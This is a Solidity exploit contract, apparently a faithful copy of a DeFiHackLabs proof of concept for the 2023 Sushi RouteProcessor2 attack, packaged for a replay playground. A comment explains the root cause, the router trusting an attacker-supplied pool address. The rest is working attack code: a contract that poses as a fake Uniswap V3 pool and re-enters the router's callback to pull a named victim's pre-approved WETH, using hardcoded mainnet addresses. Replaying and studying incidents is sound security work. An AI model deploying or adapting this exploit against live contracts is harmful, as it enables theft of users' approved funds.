// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Sushi_Router).
// The DeFiHackLabs PoC runs the attack from a Foundry test contract that ITSELF
// implements IUniswapV3Pool (SushiExp is Test, IUniswapV3Pool) — it masquerades as
// a fake Uniswap V3 "pool" so that RouteProcessor2's swap callback flow calls back
// into it. This contract is a faithful, self-contained copy of that inline attack
// (testExp -> run, swap unchanged) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from
// test/Sushi_Router_exp.sol.
//
// Root cause: RouteProcessor2.swapUniV3() reads the "pool" address directly out of
// attacker-controlled route bytes and calls IUniswapV3Pool(pool).swap(...) without
// verifying `pool` is a genuine Uniswap V3 pool deployed by the canonical factory.
// The router's only callback guard is `require(msg.sender == lastCalledPool)`, an
// identity check, not an authenticity check — since the router will call ANY
// address named in the route, "the address I just called" can BE the attacker's
// own contract. The attacker's fake `swap()` re-enters
// `uniswapV3SwapCallback(amount, 0, abi.encode(tokenIn, from))` with a
// self-chosen `from` (any address that has approved the router), and the router
// blindly executes `IERC20(tokenIn).safeTransferFrom(from, msg.sender, amount)` —
// pulling the victim's pre-approved tokens to the attacker.

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
}

// This contract doubles as the fake "pool": RouteProcessor2 is tricked into
// treating `address(this)` as a genuine Uniswap V3 pool and calls back into it.
contract SushiDrain is IUniswapV3Pool {
    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address constant VICTIM = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    IRouteProcessor2 constant PROCESSOR = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);

    // Faithful copy of testExp(): builds the malicious route (pool = address(this))
    // and calls processRoute so the router calls back into our fake swap().
    function run() external {
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route =
            abi.encodePacked(commandCode, LINK, num, share, poolType, pool, zeroForOne, recipient);

        PROCESSOR.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // native token sentinel
            0,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0x0000000000000000000000000000000000000000,
            route
        );
    }

    // Fake Uniswap V3 pool `swap()` — RouteProcessor2 calls this believing `pool`
    // (= address(this)) is a genuine pool. Instead of performing a real swap, it
    // re-enters the router's callback with a self-chosen (tokenIn, victim) pair,
    // instructing the router to pull the victim's pre-approved WETH.
    function swap(address, bool, int256, uint160, bytes calldata) external returns (int256 amount0, int256 amount1) {
        amount0 = 0;
        amount1 = 0;
        bytes memory maliciousData = abi.encode(address(WETH), VICTIM);
        PROCESSOR.uniswapV3SwapCallback(100 * 10 ** 18, 0, maliciousData);
    }
}
